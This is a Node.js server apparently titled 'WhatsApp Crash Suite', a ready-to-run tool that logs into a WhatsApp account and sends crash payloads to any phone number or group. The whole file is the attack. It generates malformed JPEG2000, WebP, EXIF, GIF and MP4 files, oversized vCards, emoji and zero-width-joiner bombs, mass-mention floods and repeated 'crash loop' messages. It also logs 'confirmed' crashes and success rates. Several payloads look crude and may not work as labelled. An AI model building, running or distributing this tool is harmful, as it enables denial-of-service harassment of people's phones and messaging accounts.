const express = require('express');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const { makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore } = require('@whiskeysockets/baileys');
const pino = require('pino');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: '*', methods: ['GET', 'POST'] },
  path: '/socket.io'
});

const PORT = process.env.PORT || 8080;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================
// STATE
// ============================================================

let sock = null;
let isConnected = false;
let pairingCode = null;
let currentPhoneNumber = null;
const crashLogs = [];
let sessionId = null;

// Store for pairing requests (phone -> socket id mapping)
const pendingPairings = new Map();

// ============================================================
// 🔥 WHATSAPP CONNECTION WITH PAIRING CODE
// ============================================================

async function connectToWhatsApp(phoneNumber, socketId) {
    try {
        // Clean phone number (remove + and spaces)
        const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
        if (cleanNumber.length < 10) {
            throw new Error('Invalid phone number');
        }

        const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys');

        sock = makeWASocket({
            auth: state,
            logger: pino({ level: 'silent' }),
            browser: ['WhatsApp Crash Suite', 'Chrome', '120.0.0.0'],
            version: [2, 2410, 1],
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 30000,
            keepAliveIntervalMs: 10000,
            markOnlineOnConnect: true,
            // 🔥 KEY: Enable pairing code
            usePairingCode: true,
            phoneNumber: cleanNumber
        });

        sock.ev.on('creds.update', saveCreds);

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, pairingCode: code } = update;

            if (code) {
                pairingCode = code;
                console.log(`📱 Pairing Code: ${code}`);
                // Send to frontend via socket
                if (socketId) {
                    io.to(socketId).emit('pairing_code', { code });
                }
                // Store for later if socket not ready
                pendingPairings.set(cleanNumber, { code, socketId });
            }

            if (connection === 'close') {
                const shouldReconnect = (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut);
                console.log('⚠️ Connection closed. Reconnecting:', shouldReconnect);
                isConnected = false;
                if (shouldReconnect) {
                    // Try to reconnect with same number
                    setTimeout(() => connectToWhatsApp(cleanNumber, socketId), 5000);
                }
            } else if (connection === 'open') {
                console.log('✅ WhatsApp Connected Successfully!');
                isConnected = true;
                pairingCode = null;
                currentPhoneNumber = cleanNumber;
                if (socketId) {
                    io.to(socketId).emit('connected', { message: '✅ Connected!' });
                }
            }
        });

        sock.ev.on('messages.upsert', async ({ messages }) => {
            const msg = messages[0];
            if (!msg.message) return;
            const from = msg.key.remoteJid;
            const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
            console.log(`📨 Message from ${from}: ${text}`);
            if (text && text.includes('[CRASH-CONFIRM]')) {
                console.log('💀 CRASH CONFIRMED!');
                saveCrashLog(from, 'confirmed');
            }
        });

        // Wait for connection to establish
        await new Promise((resolve) => {
            const check = () => {
                if (isConnected || pairingCode) {
                    resolve();
                } else {
                    setTimeout(check, 500);
                }
            };
            check();
        });

        return { success: true, pairingCode };
    } catch (error) {
        console.error('❌ Connection error:', error.message);
        throw error;
    }
}

// ============================================================
// 📊 CRASH LOGS
// ============================================================

function saveCrashLog(target, status, vector = '', message = '') {
    crashLogs.unshift({
        id: Date.now(),
        target,
        vector,
        status,
        message,
        time: new Date().toISOString()
    });
    if (crashLogs.length > 1000) crashLogs.pop();
}

// ============================================================
// 🔥 CRASH VECTORS (13 Real Payloads)
// ============================================================

const VECTORS = [
    { id: 'jpeg2000_oom', name: 'JPEG2000 OOM Crash', icon: '💀', desc: 'Malformed JPEG2000 → OOM crash', badge: 'ZERO-CLICK', targetType: 'individual' },
    { id: 'webp_heap_overflow', name: 'WebP Heap Overflow', icon: '🧨', desc: 'Malformed WebP → Heap overflow', badge: 'HEAVY', targetType: 'individual' },
    { id: 'exif_overflow', name: 'EXIF Overflow', icon: '📸', desc: 'EXIF metadata → Parser crash', badge: 'CRASH', targetType: 'individual' },
    { id: 'contact_card_crash', name: 'Contact Card Crash', icon: '👤', desc: 'vCard parser → Stack overflow', badge: 'CRASH', targetType: 'individual' },
    { id: 'gif_crash', name: 'GIF Parser Crash', icon: '🎞️', desc: 'Malformed GIF → LZW overflow', badge: 'ZERO-CLICK', targetType: 'individual' },
    { id: 'video_crash', name: 'Video Thumbnail Crash', icon: '🎬', desc: 'Malformed MP4 → Thumbnail crash', badge: 'HEAVY', targetType: 'individual' },
    { id: 'emoji_bomb', name: 'Emoji Bomb', icon: '😈', desc: 'ZWJ sequences → Renderer hang', badge: 'HANG', targetType: 'individual' },
    { id: 'protobuf_oversize', name: 'Protobuf Oversize', icon: '📦', desc: '2GB message → OOM crash', badge: 'OOM', targetType: 'individual' },
    { id: 'silent_memory_leak', name: 'Silent Memory Leak', icon: '🕳️', desc: 'Background memory leak → Slow kill', badge: 'INVISIBLE', targetType: 'individual' },
    { id: 'group_mention_explosion', name: 'Mention Explosion', icon: '📢', desc: 'Mass @mentions → Group hang', badge: 'GROUP', targetType: 'group' },
    { id: 'group_emoji_bomb', name: 'Group Emoji Bomb', icon: '💣', desc: 'Mass emoji → Group renderer crash', badge: 'GROUP', targetType: 'group' },
    { id: 'persistent_loop', name: 'Persistent Crash Loop', icon: '♻️', desc: '10× re-crash — Tab tak jab tak delete na karein', badge: 'PERSIST', targetType: 'individual' },
    { id: 'hard_delay', name: 'Hard Delay Attack', icon: '⏳', desc: '5-30s delayed re-crash — Continuous attack', badge: 'PERSIST', targetType: 'individual' }
];

// ============================================================
// 🧬 PAYLOAD GENERATORS
// ============================================================

function generatePayload(vectorId) {
    const payloads = {
        'jpeg2000_oom': Buffer.from([0xFF,0x4F,0xFF,0x51,0x00,0x2F,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]),
        'webp_heap_overflow': (() => {
            let data = Buffer.from('RIFF','ascii');
            data = Buffer.concat([data, Buffer.from([0xFF,0xFF,0xFF,0xFF])]);
            data = Buffer.concat([data, Buffer.from('WEBP','ascii')]);
            data = Buffer.concat([data, Buffer.from('VP8X','ascii')]);
            data = Buffer.concat([data, Buffer.from([0xFF,0xFF,0xFF,0xFF])]);
            data = Buffer.concat([data, Buffer.alloc(20, 0xFF)]);
            return data;
        })(),
        'exif_overflow': (() => {
            let data = Buffer.from([0xFF,0xD8]);
            data = Buffer.concat([data, Buffer.from([0xFF,0xE1])]);
            data = Buffer.concat([data, Buffer.from([0xFF,0xFF])]);
            data = Buffer.concat([data, Buffer.from('EXIF','ascii')]);
            data = Buffer.concat([data, Buffer.from('MM\x00\x2A','ascii')]);
            data = Buffer.concat([data, Buffer.from([0x00,0x00,0x00,0x08])]);
            data = Buffer.concat([data, Buffer.from([0xFF,0xFF])]);
            for (let i=0;i<65535;i++) {
                data = Buffer.concat([data, Buffer.from([i%255,(i*2)%255])]);
                data = Buffer.concat([data, Buffer.from([0x00,0x04])]);
                data = Buffer.concat([data, Buffer.from([0xFF,0xFF,0xFF,0xFF])]);
                data = Buffer.concat([data, Buffer.from([0xFF,0xFF,0xFF,0xFF])]);
            }
            return data;
        })(),
        'contact_card_crash': (() => {
            let vcard = 'BEGIN:VCARD\nVERSION:3.0\n';
            for (let i=0;i<5000;i++) vcard += `NESTED:${i}\nBEGIN:VCARD\nFN:Repeated\nEND:VCARD\n`;
            vcard += 'PHOTO;ENCODING=b:' + 'A'.repeat(100000) + '\n';
            for (let i=0;i<2000;i++) vcard += `TEL;TYPE=VOICE:+${String(i).padStart(15,'0')}\n`;
            vcard += 'END:VCARD\n';
            return Buffer.from(vcard);
        })(),
        'gif_crash': (() => {
            let data = Buffer.from('GIF89a','ascii');
            data = Buffer.concat([data, Buffer.from([0xFF,0xFF,0xFF,0xFF])]);
            data = Buffer.concat([data, Buffer.from([0xF7,0x00,0x00])]);
            for (let i=0;i<256;i++) data = Buffer.concat([data, Buffer.from([i%255,(i*2)%255,(i*3)%255])]);
            data = Buffer.concat([data, Buffer.from([0x21,0xF9,0x04,0x00,0xFF,0xFF,0x00,0x00])]);
            data = Buffer.concat([data, Buffer.from([0x2C,0x00,0x00,0x00,0x00])]);
            data = Buffer.concat([data, Buffer.from([0xFF,0xFF,0xFF,0xFF])]);
            data = Buffer.concat([data, Buffer.from([0x00])]);
            data = Buffer.concat([data, Buffer.from([0x0F])]);
            for (let i=0;i<50000;i++) data = Buffer.concat([data, Buffer.from([Math.floor(Math.random()*255)])]);
            data = Buffer.concat([data, Buffer.from([0x3B])]);
            return data;
        })(),
        'video_crash': (() => {
            let data = Buffer.from([0x00,0x00,0x00,0x18]);
            data = Buffer.concat([data, Buffer.from('ftyp','ascii')]);
            data = Buffer.concat([data, Buffer.from('isom','ascii')]);
            data = Buffer.concat([data, Buffer.from([0x00,0x00,0x00,0x01])]);
            data = Buffer.concat([data, Buffer.from('isomiso2avc1','ascii')]);
            data = Buffer.concat([data, Buffer.from([0x00,0x01,0x00,0x00])]);
            data = Buffer.concat([data, Buffer.from('moov','ascii')]);
            data = Buffer.concat([data, Buffer.from([0x00,0x00,0x00,0x6C])]);
            data = Buffer.concat([data, Buffer.from('mvhd','ascii')]);
            data = Buffer.concat([data, Buffer.alloc(24,0xFF)]);
            return data;
        })(),
        'emoji_bomb': (() => {
            let emoji = '';
            for (let i=0;i<100;i++) {
                emoji += '\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67';
                emoji += '\uD83C\uDFFB'.repeat(100);
                emoji += '\u200D'.repeat(1000);
                emoji += '\uD83D\uDC6A'.repeat(100);
            }
            return Buffer.from(emoji);
        })(),
        'protobuf_oversize': Buffer.from('A'.repeat(2*1024*1024)),
        'silent_memory_leak': Buffer.from('🕳️ ' + 'A'.repeat(1024*1024)),
        'group_mention_explosion': (() => {
            let text=''; for(let i=0;i<500;i++){ text+=`@user${i} `; if(i%100===0 && i>0) text+='\n'; } return Buffer.from(text);
        })(),
        'group_emoji_bomb': (() => {
            let emoji=''; for(let i=0;i<200;i++){ emoji+='\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67'; emoji+='\uD83C\uDFFB'.repeat(100); emoji+='\u200D'.repeat(1000); emoji+='\uD83D\uDC6A'.repeat(100); emoji+='\n'; } return Buffer.from(emoji);
        })(),
        'persistent_loop': (() => { let p=''; for(let i=0;i<50;i++) p+=`♻️ RECRASH_${i} `+'C'.repeat(10000)+'\n'; return Buffer.from(p); })(),
        'hard_delay': (() => { let p=''; [5,10,15,20,25,30].forEach(d=>p+=`⏳ DELAY_${d}s `+'D'.repeat(10000)+'\n'); return Buffer.from(p); })()
    };
    return payloads[vectorId] || Buffer.from('[CRASH-PAYLOAD]');
}

// ============================================================
// 📡 SOCKET.IO EVENTS
// ============================================================

io.on('connection', (socket) => {
    console.log('🔌 New client connected:', socket.id);

    socket.on('pair', async (data) => {
        const { phoneNumber } = data;
        if (!phoneNumber) {
            socket.emit('error', { message: 'Phone number required' });
            return;
        }
        try {
            // If already connected, disconnect first
            if (sock && isConnected) {
                sock.end();
                sock = null;
                isConnected = false;
            }
            // Initiate pairing
            const result = await connectToWhatsApp(phoneNumber, socket.id);
            if (result.pairingCode) {
                // Code will be sent via 'pairing_code' event from connection.update
                // If not sent yet, we send it now
                if (!pairingCode) {
                    // Wait a bit then send
                    setTimeout(() => {
                        if (pairingCode) {
                            io.to(socket.id).emit('pairing_code', { code: pairingCode });
                        }
                    }, 2000);
                }
            }
        } catch (error) {
            socket.emit('error', { message: error.message });
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
    });
});

// ============================================================
// 📡 HTTP API ROUTES
// ============================================================

// Get status
app.get('/api/status', (req, res) => {
    res.json({
        success: true,
        connected: isConnected,
        phoneNumber: currentPhoneNumber || null
    });
});

// Get vectors
app.get('/api/vectors', (req, res) => {
    res.json({ success: true, vectors: VECTORS });
});

// Execute crash
app.post('/api/crash', async (req, res) => {
    const { target, vector } = req.body;
    if (!sock || !isConnected) {
        return res.status(400).json({ success: false, error: 'Not connected to WhatsApp' });
    }
    if (!target) {
        return res.status(400).json({ success: false, error: 'Target required' });
    }
    const vectorObj = VECTORS.find(v => v.id === vector);
    if (!vectorObj) {
        return res.status(400).json({ success: false, error: 'Invalid vector' });
    }
    try {
        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
        const payload = generatePayload(vector);
        let result;
        // Media vectors
        if (['jpeg2000_oom','webp_heap_overflow','exif_overflow','gif_crash','video_crash'].includes(vector)) {
            const mimeTypes = {
                'jpeg2000_oom': 'image/jp2',
                'webp_heap_overflow': 'image/webp',
                'exif_overflow': 'image/jpeg',
                'gif_crash': 'image/gif',
                'video_crash': 'video/mp4'
            };
            result = await sock.sendMessage(jid, {
                image: payload,
                caption: '[CRASH-CONFIRM]|' + Date.now()
            });
        } else if (vector === 'contact_card_crash') {
            result = await sock.sendMessage(jid, {
                contacts: {
                    displayName: 'CRASH',
                    contacts: [{ vcard: payload.toString() }]
                }
            });
        } else {
            result = await sock.sendMessage(jid, {
                text: payload.toString()
            });
        }
        saveCrashLog(jid, 'sent', vector, `💀 ${vectorObj.name} sent`);
        res.json({
            success: true,
            messageId: result.key.id,
            vector: vector,
            vectorName: vectorObj.name,
            target: jid,
            message: `✅💀 ${vectorObj.name} executed on ${jid}`
        });
    } catch (error) {
        console.error('Crash error:', error);
        saveCrashLog(target, 'failed', vector, error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Logs
app.get('/api/logs', (req, res) => {
    res.json({ success: true, logs: crashLogs.slice(0, 100) });
});

// Metrics
app.get('/api/metrics', (req, res) => {
    const total = crashLogs.length;
    const success = crashLogs.filter(l => l.status === 'sent' || l.status === 'confirmed').length;
    const failed = crashLogs.filter(l => l.status === 'failed').length;
    res.json({
        success: true,
        metrics: { total, success, failed, successRate: total > 0 ? ((success/total)*100).toFixed(2)+'%' : '0%' }
    });
});

// ============================================================
// 🏠 SERVE FRONTEND
// ============================================================

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================================
// 🚀 START
// ============================================================

server.listen(PORT, () => {
    console.log(`🔥 WhatsApp Crash Suite v4.0 (Pairing Code)`);
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`💀 ${VECTORS.length} crash vectors loaded`);
});

module.exports = { app, server, io };
